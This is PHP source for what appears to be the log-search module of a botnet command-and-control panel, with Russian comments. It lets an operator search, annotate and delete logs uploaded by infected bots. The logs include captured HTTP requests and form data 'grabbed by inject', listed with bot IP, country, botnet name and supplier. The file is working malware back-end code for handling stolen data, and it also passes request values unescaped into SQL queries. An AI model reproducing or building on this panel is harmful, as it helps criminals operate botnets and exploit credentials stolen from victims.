<?php

	if (!BOT) exit();


	include "logs.act.fn.php";


// ##############
// Коммент к боту
if (isset($_POST['botcomment'])) {
	$_POST['botcomment'] = mysql_escape_string($_POST['botcomment']);
	$query = "UPDATE `bots` SET `comment`='{$_POST['botcomment']}' WHERE `bot_uid`='{$_POST['bot_uid']}'";
	mysql_query($query);
	die ('*'.$_POST['botcomment']);
}


// ##############
// Коммент к логу
if (isset($_POST['logcomment'])) {
	$_POST['logcomment'] = mysql_escape_string($_POST['logcomment']);
	foreach($LOGSTABLES as $var) {
		$query  = "UPDATE `{$var}` SET `comment`='{$_POST['logcomment']}' WHERE `log_id`=".intval($_POST['log_id']);
		mysql_query($query);
	}
	die ('*'.$_POST['logcomment']);
}


// ##############
// Удаление логов
if (isset($_POST['dellogs'])) {
	array_walk($_POST['logid'], 'intval');
	foreach($LOGSTABLES as $var) {
		$query = "DELETE FROM `{$var}` WHERE `log_id`=".implode(' OR `log_id`=', $_POST['logid']);
		mysql_query($query);
	}
	die ('success');
}


// ##############
// Поиск по фразе
if(isset($_POST['phrase'])){


	// ###################
	// Логирование поисков
	if (!empty($_POST['phrase'])) {
		$fp = fopen('../data/temp/searchlog.txt', 'a');
		fwrite($fp, date("d.m.Y H:i:s")."\t".$_SERVER['REMOTE_ADDR']."\t".$_POST['phrase']."\n");
		fclose($fp);
	}


// ##############
// Условия поиска
	$CONDITIONS = '';
	if (!empty($_POST['phrase'])) $CONDITIONS[] = "`data` LIKE '%".mysql_escape_string($_POST['phrase'])."%'";
	if (!empty($_POST['']));
	if ($CONDITIONS) $CONDITIONS = ' WHERE '.implode(' AND ', $CONDITIONS);


// ##################
// Таблицы для поиска
	$SELTABLES = array();
	sort($LOGSTABLES);
	reset($LOGSTABLES);
	while ($val = current($LOGSTABLES)) {
		next($LOGSTABLES);
		if ($val==$_POST['from_date'] or $val==$_POST['to_date']) break;
	}
	$SELTABLES[] = $val;
	if ($_POST['from_date']!=$_POST['to_date']) while ($val = current($LOGSTABLES)) {
		next($LOGSTABLES);
		$SELTABLES[] = $val;
		if ($val==$_POST['from_date'] or $val==$_POST['to_date']) break;
	}


// #####################
// Сборка запроса к базе
	foreach($SELTABLES as $key => $var) $SELTABLES[$key] = "SELECT * FROM `{$var}`".$CONDITIONS;
	$query = implode(' UNION ', $SELTABLES).' LIMIT '.intval($_POST['limit']);
	$result = mysql_query($query) or die("Query failed : " . mysql_error());


// #################
// Выдача результата
	print "<!-- Search result begin -->
<input type='submit' value='Expand all' class='button' onclick=\"$(this).parent().find('div').show();\"><input type='submit' value='Collapse all' class='button' onclick=\"$(this).parent().find('div').hide();\"><input type='submit' value='Toggle' class='button' onclick=\"$(this).parent().find('div').toggle();\"> |
<input type='submit' value='Select all' class='button' onclick=\"$(this).parent().find(':checkbox').attr('checked', true);\"><input type='submit' value='Unselect all' class='button'onclick=\"$(this).parent().find(':checkbox').removeAttr('checked');\"><input type='submit' value='Invert' class='button'onclick=\"$(this).parent().find(':checkbox').checkToggle();\"> |
<input type='submit' value='Remember selected' class='button' onclick='remclick(this);return false;'><input type='submit' value='Export selected' class='button' onclick='exportclick(this);return false;'><input type='submit' value='Delete selected' class='button' onclick='deleteclick(this);return false;'>

<form onSubmit='return false'>

<table cellpadding=0 cellspacing=0 class='block'>
<tr><td>\n";


	$i = 0;
	while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
		$i++;

		$datasize = strlen($row['data']);
		$row['data'] = addslashes(htmlspecialchars($row['data']));
		switch ($row['data_type']) {
		case 0:
			$BRIEF = "";
			break;
		case 1:
			$BRIEF = "";
			break;
		case 2:
			$BRIEF = GetHttpReqBrief($row['data']);
			$row['data'] = HighLight2($row['data']);
			break;
		case 3:
			$BRIEF = "<b>Grabbed by inject data</b>";
			break;
		}
		$row['data'] = nl2br($row['data']);


//	\"$(this).parent().parent().parent().next().slideToggle('fast');\"

//	<td onclick=\"$(this).find('div').html('<input type=text>')\"><div style='width:300px;'>".htmlspecialchars($row['comment'])."</div></td>

//	$(this).find('div').hide();$(this).find('select').fadeIn();


		$bot = mysql_fetch_array(mysql_query("SELECT * FROM `bots` WHERE `bot_uid`='{$row['bot_uid']}';"), MYSQL_ASSOC);


		print "<table cellpadding=2 cellspacing=1 width=100%>
<tr class=briefrow".($i % 2).">
	<td width=13px height=21px><input type=checkbox name='logid[]' value='{$row['log_id']}'></td>
	<td onclick=\"$(this).parent().parent().parent().next().slideToggle('fast');\"><div class='briefcell'>{$BRIEF}</div></td>
	<td onclick=\"CommentLog(this, {$row['log_id']});\"><div style='width:300px;'>".htmlspecialchars($row['comment'])."</div></td>
	<td onclick=\"CommentBot(this, '{$row['bot_uid']}');\"><div id='UID{$row['bot_uid']}' style='width:300px;'>".htmlspecialchars($bot['comment'])."</div></td>
</tr>
</table>


<div style='margin-top: -1; display: none;'>
<table cellpadding=2 cellspacing=1 width=100%>
<tr class=logrow".($i % 2).">

	<td align=right valign=top width=70px class=briefrow".($i % 2)."><b>Log ID:<br>
	Bot UID:<br>
	Data type:<br>
	Time:<br>
	Bot IP<br>
	Country:<br>
	Botnet:<br>
	Supplier:<br>(sub):</b></td>

	<td valign=top class=briefrow".($i % 2)."><div style='width:100px;'># {$row['log_id']} <a href='{$row['log_id']}'>({$datasize})</a><br>
	{$row['bot_uid']}<br>
	{$DATA_TYPES[$row['data_type']]}<br>
	".date("d/m/y H:i:s", $row['timestamp'])."<br>
	{$row['bot_ip']}<br>
	[{$row['bot_country']}] {$GeoIP->GEOIP_COUNTRY_NAMES[$GeoIP->GEOIP_COUNTRY_CODE_TO_NUMBER[$row['bot_country']]]}<br>
	[ {$row['bot_net']} ]<br>
	[ {$row['bot_supp']} ]<br>({$row['supp_sub']})</div></td>

	<td valign=top><div style='width:1052px;white-space:normal;'>{$row['data']}</div></td>

</tr>
</table>
</div>\n\n";



	}
	print "</td></tr>
</table>

</form>


<!-- Search result end -->
			</td>
		</tr>\n";


	mysql_free_result($result);


	print "<script>


	function CommentLog(zis, log_id) {
		if (!$(zis).find('input').length) {
			var data = $(zis).find('div').text();
			$(zis).find('div').html('<input type=text name=logcomment>').find('input').focus().val(data).keyup(function(e) {
				if(e.keyCode == 13) {
					data = $(zis).find('input').serialize();
					$(zis).find('div').html('<img src=\"images/saving.gif\">');
					$.post('?logs', data+'&log_id='+log_id, function(data) { $(zis).find('div').text(data); });
				}
			});
		}
	}


	function CommentBot(zis, bot_uid) {
		if (!$(zis).find('input').length) {
			var data = $(zis).find('div').text();
			$(zis).find('div').html('<input type=text name=botcomment>').find('input').focus().val(data).keyup(function(e) {
				if(e.keyCode == 13) {
					data = $(zis).find('input').serialize();
					$(zis).find('div').html('<img src=\"images/saving.gif\">');
					$.post('?logs', data+'&bot_uid='+bot_uid, function(data) {
						$('#[id=UID'+bot_uid+']').text(data);
					//	$('.UID'+bot_uid).text(data);	// class
					});
				}
			});
		}
	}









	jQuery.fn.checkToggle = function() {
	   return this.each(function() {
	      this.checked = !this.checked;
	   });
	};


	function remclick(zis) {
		alert('Not ready yet');
	}


	function exportclick(zis) {
		alert('Not ready yet');
	}


	function deleteclick(zis) {
		var frm = $(zis).parent().find('form');
		var req = $(frm).serialize();
		if (req == '') { alert('Select something first'); return false; }
		if (confirm('Are you sure you want to delete selected logs ?')==false) return false;
		$(zis).attr('disabled', true);
		$.post('?logs', 'dellogs=&' + req, function(data) {
			if (data == 'success') {
				var els = $(frm).find('input:checked').parent().parent().parent();
				$(els).parent().next().remove();
				$(els).remove();
			}
			else alert(data);
			$(zis).attr('disabled', false);
		});
	}










</script>";

}












	exit();

?>